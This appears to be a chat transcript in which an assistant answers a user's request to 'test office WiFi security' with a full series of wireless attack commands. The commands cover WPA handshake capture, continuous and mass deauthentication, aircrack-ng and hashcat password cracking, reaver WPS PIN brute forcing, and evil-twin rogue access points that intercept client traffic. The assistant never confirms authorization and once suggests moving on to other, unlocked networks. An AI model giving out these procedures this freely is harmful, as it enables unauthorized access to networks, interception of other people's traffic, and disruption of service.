conversation.content: I need to test our office WiFi security. How do I start?

First, enable monitor mode on your wireless adapter with `airmon-ng start wlan0`. This creates wlan0mon interface. Then run `airodump-ng wlan0mon` to scan for networks. You'll see all WiFi networks with their encryption, channels, and connected clients.
I see the target network on channel 6. How do I capture the WPA handshake?

Use `airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon` to focus on that network. Then in another terminal, run `aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon` to disconnect clients. When they reconnect, you'll see 'WPA handshake' in the airodump-ng window.
I captured a handshake. How do I crack the password?

Use aircrack-ng with a wordlist: `aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap`. It will test each password against the handshake. If the password is in the wordlist, you'll see 'KEY FOUND!' with the password.
The deauth attack isn't working. What's wrong?

First check if your card supports injection with `aireplay-ng --test wlan0mon`. You should see 30/30: 100% success. If injection fails, your card may not support monitor mode properly. Also run `airmon-ng check kill` to stop interfering processes like NetworkManager.
How can I scan for WPS-enabled routers?

Use wash: `wash -i wlan0mon`. It shows all WPS-enabled access points with their lock status. Look for 'Lck: No' - these are unlocked and vulnerable to PIN attacks. The output includes BSSID, channel, WPS version, and vendor.
I found an unlocked WPS router. How do I attack it?

Try Pixie Dust first: `reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv`. This exploits weak randomization and recovers the PIN in seconds. If that works, reaver will show both the WPS PIN and WPA password automatically.
Pixie Dust failed. What's the alternative?

Use standard PIN brute force: `reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv`. This tests all possible PINs but takes hours. Add `-d 2 -t 5 -r 3:15` for delays to avoid rate limiting. The router may lock WPS after too many attempts.
How do I capture handshakes from multiple networks automatically?

Use bettercap with a caplet: `bettercap -iface wlan0mon -caplet wifi-handshakes.cap`. Bettercap will scan for networks, deauth clients, and automatically capture handshakes. Check `/root/bettercap-wifi-handshakes.pcap` for captured handshakes.
I want to create a fake WiFi network. How?

Use bettercap: `echo 'wifi.recon on; wifi.ap' | bettercap -iface wlan0mon`. This creates a rogue access point. Configure SSID with `set wifi.ap.ssid FreeWiFi` first. Clients connecting to your fake AP will have their traffic intercepted.
How do I deauth all clients from a specific network?
Run `aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon`. The '0' means continuous attack until you press Ctrl+C. This broadcasts deauth frames, disconnecting all clients from that BSSID.
Can I target a specific client for deauth?

Yes, use `aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon`. The `-c` flag specifies the client MAC. This is more targeted and less disruptive than broadcasting to all clients.
My wireless card doesn't show up in airmon-ng. Why?

Run `airmon-ng` to list interfaces. If nothing appears, your card may not support monitor mode. Check with `iwconfig` - if you see 'Mode:Managed', the card is detected but may not support monitor mode. You need a card with monitor mode support like Atheros or Ralink chipsets.
How do I scan both 2.4 GHz and 5 GHz networks?
Use `airodump-ng --band abg wlan0mon`. The 'abg' flag enables scanning across 802.11a (5 GHz), 802.11b, and 802.11g (both 2.4 GHz). Your wireless card must support dual-band for this to work.
The handshake capture is taking forever. Any tips?

Make sure you're on the correct channel: `airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon`. Wait for clients to appear in the station list, then deauth them. Handshakes are only captured during the 4-way authentication when clients connect or reconnect.
How do I know if I captured a valid handshake?

Airodump-ng shows 'WPA handshake: AA:BB:CC:DD:EE:FF' in the top-right when successful. You can verify with `aircrack-ng capture-01.cap` - it will show 'WPA (1 handshake)' next to the network. If it says '0 handshake', the capture is incomplete.
What's the best wordlist for WPA cracking?

Start with rockyou.txt: `/usr/share/wordlists/rockyou.txt` (14 million passwords). For targeted attacks, create custom wordlists based on the target (company name, location, years). Use crunch to generate wordlists with specific patterns.
Aircrack-ng is too slow. How can I speed it up?

Use hashcat with GPU acceleration instead. First convert the capture: `cap2hccapx.bin capture-01.cap output.hccapx`. Then: `hashcat -m 2500 output.hccapx wordlist.txt`. GPUs are 50-100x faster than CPU cracking.
How do I save the cracked password to a file?
Add `-l` flag: `aircrack-ng -w wordlist.txt -l cracked.txt capture-01.cap`. When the password is found, it's saved to cracked.txt. This is useful for batch processing multiple captures.
What does 'WPS Locked' mean in wash results?

WPS locked means the router has rate limiting enabled after too many failed PIN attempts. It temporarily blocks WPS attacks. 'Lck: Yes' in wash output indicates locked status. Wait 24 hours or try other networks with 'Lck: No'.
How do I stop monitor mode when done?
Run `airmon-ng stop wlan0mon`. This disables monitor mode and restores wlan0 to managed mode. Then restart NetworkManager if needed: `systemctl start NetworkManager` to reconnect to normal WiFi.
Can I use bettercap for mass deauth attacks?

Yes: `echo 'wifi.recon on; wifi.deauth all' | bettercap -iface wlan0mon -eval`. This deauths all clients from all detected access points simultaneously. Use responsibly - this causes widespread disruption. Only use in authorized testing.
How do I capture handshakes and save to custom location?

Use bettercap: `echo 'set wifi.handshakes.file /tmp/handshakes.pcap; wifi.recon on; wifi.deauth AA:BB:CC:DD:EE:FF' | bettercap -iface wlan0mon`. This captures handshakes to your specified path instead of the default location.
What if the password isn't in my wordlist?

You have three options: 1) Use larger wordlists (wpa-dic, kaonashi, weakpass), 2) Generate custom wordlist with crunch/maskprocessor based on password policy, 3) Use GPU cracking with rules to mutate existing wordlists. Pure brute force of all combinations is impractical.
How do I test if my wireless card supports packet injection?

Run `aireplay-ng --test wlan0mon` after enabling monitor mode. You should see 'Injection is working!' and 30/30: 100%. If it shows 0/30, your card doesn't support injection and can't perform deauth attacks.
Why does airodump-ng show 'fixed channel wlan0mon: -1'?

This error means processes are interfering. Run `airmon-ng check kill` to stop NetworkManager, wpa_supplicant, and dhclient. These processes try to use the wireless card and prevent monitor mode from working properly.
How do I crack a specific network when I have multiple in the capture?
Use `-b` flag with BSSID: `aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap`. This targets only the specified network. Otherwise aircrack-ng will ask you to choose from the list.
Can I perform a fake authentication attack?

Yes, use `aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon`. The `-h` is your spoofed MAC. Fake auth is needed for some WEP attacks but rarely useful for WPA2. You'll see 'Authentication successful' if it works.
How do I create an evil twin with the same SSID as the target?

Use bettercap: `set wifi.ap.ssid TargetNetwork; set wifi.ap.channel 6; wifi.recon on; wifi.ap`. Then run deauth on the real AP to force clients to connect to your fake one: `wifi.deauth AA:BB:CC:DD:EE:FF`. Clients won't easily distinguish your AP from the real one.
What's the difference between airodump-ng and wash?

Airodump-ng scans all WiFi networks showing encryption, channels, clients, and captures handshakes. Wash specifically scans for WPS-enabled routers and shows WPS lock status. Use airodump-ng for WPA2 handshake attacks, wash for WPS PIN attacks.
How long does a typical WPS PIN brute force take with reaver?

Without Pixie Dust, reaver must test up to 11,000 PINs. At 1-2 PINs per second, expect 2-6 hours. Many routers have rate limiting or lock after 10-20 attempts. Pixie Dust attack takes seconds but only works on routers with weak randomization. Always try Pixie Dust first with `-K 1`.
